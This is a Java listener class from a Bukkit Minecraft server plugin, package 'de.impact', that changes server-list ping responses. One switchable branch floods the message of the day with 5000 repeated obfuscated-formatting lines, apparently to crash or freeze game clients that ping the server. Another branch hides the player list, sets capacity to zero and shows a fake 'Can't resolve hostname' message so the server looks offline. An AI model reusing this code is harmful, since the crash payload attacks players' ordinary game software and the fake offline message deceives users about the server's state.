package de.impact.listeners;

import com.google.common.base.Strings;
import de.impact.utils.lock.LockUtils;
import de.impact.utils.lock.Locks;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.server.ServerListPingEvent;

import java.util.Iterator;

public class ServerPingListener implements Listener {

    @EventHandler
    public void ping(ServerListPingEvent event) {

        Iterator<Player> players = event.iterator();

        if(LockUtils.isLocked(Locks.PINGCRASH)) {
            event.setMotd(Strings.repeat("§kd\n", 5000));
            return;
        }

        if(LockUtils.isLocked(Locks.PING)) {
            while(players.hasNext()) {
                if(players.next() != null)
                    players.remove();
            }
            event.setMaxPlayers(0);
            event.setMotd("§4Can't resolve hostname");
        }

    }

}